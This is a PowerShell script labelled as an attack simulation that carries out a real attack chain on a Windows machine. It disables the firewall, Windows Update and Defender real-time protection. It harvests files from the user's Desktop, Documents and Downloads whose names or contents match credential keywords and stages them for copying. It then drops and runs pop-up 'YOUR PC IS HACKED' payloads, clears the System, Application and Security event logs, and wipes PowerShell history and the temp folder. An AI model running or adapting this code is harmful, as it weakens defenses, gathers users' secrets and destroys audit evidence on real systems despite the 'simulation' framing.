Clear-Host
Write-Host "========== ADVANCED CYBER ATTACK SIMULATION ==========" -ForegroundColor Red

# ---------- ADMIN CHECK ----------
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Run as Administrator!" -ForegroundColor Yellow
    return
}

Start-Sleep 2

# =========================================================
# STAGE 1 — DEFENSE EVASION
# =========================================================
Write-Host "[!] Weakening system defenses..." -ForegroundColor Yellow

try { Set-NetFirewallProfile -Enabled False } catch {}
try { Stop-Service wuauserv -Force } catch {}
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}

Start-Sleep 2

# =========================================================
# STAGE 2 — DATA DISCOVERY + FULL CONTENT STAGING
# =========================================================
Write-Host "[+] Scanning for sensitive information..." -ForegroundColor Yellow

$keywords = "password","pass","pwd","user","login","credential","secret","token","api_key"

$paths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
)

$resultFile = "$env:TEMP\sensitive_data.txt"
Remove-Item $resultFile -ErrorAction SilentlyContinue

foreach ($path in $paths) {
    if (Test-Path $path) {

        Get-ChildItem $path -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {

            $file = $_.FullName

            # Filename match
            if ($keywords | Where-Object { $file.ToLower().Contains($_) }) {

                Write-Host "[FILE NAME MATCH] $file" -ForegroundColor Red

                "===== FILE: $file =====" | Out-File $resultFile -Append
                Get-Content $file -ErrorAction SilentlyContinue | Out-File $resultFile -Append
                "" | Out-File $resultFile -Append
            }

            # Content match
            try {
                $matches = Select-String -Path $file -Pattern $keywords -SimpleMatch -ErrorAction Stop
                foreach ($m in $matches) {

                    Write-Host "[CONTENT MATCH] $file : $($m.Line.Trim())" -ForegroundColor Yellow

                    if (-not (Select-String -Path $resultFile -Pattern $file -Quiet)) {
                        "===== FILE: $file =====" | Out-File $resultFile -Append
                        Get-Content $file -ErrorAction SilentlyContinue | Out-File $resultFile -Append
                        "" | Out-File $resultFile -Append
                    }
                }
            }
            catch {}
        }
    }
}

if (Test-Path $resultFile) {
    Write-Host "[!] Sensitive data staged at $resultFile" -ForegroundColor Red
} else {
    Write-Host "[+] No obvious sensitive data found" -ForegroundColor Green
}

Start-Sleep 2

# =========================================================
# EXFILTRATION WINDOW — 15 SEC
# =========================================================
if (Test-Path $resultFile) {

    Write-Host "[!!!] Copy NOW — file will self-delete in 15 seconds" -ForegroundColor Red

    Start-Process powershell -WindowStyle Hidden -ArgumentList "
    Add-Type -AssemblyName PresentationFramework;
    [System.Windows.MessageBox]::Show('Sensitive data collected. Copy NOW.', 'EXFILTRATION WINDOW')
    "

    Start-Sleep 15
}

# =========================================================
# 🔥 NEW — DWELL TIME BEFORE PAYLOAD (30 SEC)
# =========================================================
Write-Host "[+] System idle... awaiting further instructions (30 sec)" -ForegroundColor Cyan
Start-Sleep 30

# =========================================================
# STAGE 3 — PAYLOAD DROP
# =========================================================
$payloadPath = "$env:TEMP\payload.ps1"

@"
Add-Type -AssemblyName PresentationFramework
\$end = (Get-Date).AddSeconds(20)
while((Get-Date) -lt \$end)
{
    [System.Windows.MessageBox]::Show('YOUR PC IS HACKED','SECURITY BREACH','OK','Error')
}
"@ | Out-File $payloadPath -Force

$batPath = "$env:USERPROFILE\Desktop\SYSTEM_ALERT.bat"

@"
:loop
msg * YOUR PC IS HACKED
timeout /t 1 >nul
goto loop
"@ | Out-File $batPath -Encoding ASCII -Force

Write-Host "[!] Payloads deployed" -ForegroundColor Red

# =========================================================
# EXECUTE PAYLOAD
# =========================================================
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$payloadPath`""
$batProcess = Start-Process $batPath -PassThru

Start-Sleep 20

try { Stop-Process -Id $batProcess.Id -Force } catch {}
Get-Process msg -ErrorAction SilentlyContinue | Stop-Process -Force

# =========================================================
# STAGE 5 — TRACE REMOVAL
# =========================================================
Write-Host "[!] Removing traces..." -ForegroundColor Yellow

Remove-Item $payloadPath -ErrorAction SilentlyContinue
Remove-Item $batPath -ErrorAction SilentlyContinue
Remove-Item $resultFile -ErrorAction SilentlyContinue

wevtutil cl System
wevtutil cl Application
wevtutil cl Security

Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue

# =========================================================
# RESTORE SYSTEM
# =========================================================
try { Set-NetFirewallProfile -Enabled True } catch {}
try { Start-Service wuauserv } catch {}
try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}

Write-Host "`n[+] Attacker disappeared — No obvious evidence left" -ForegroundColor Green
Write-Host "========== SIMULATION COMPLETE ==========" -ForegroundColor Green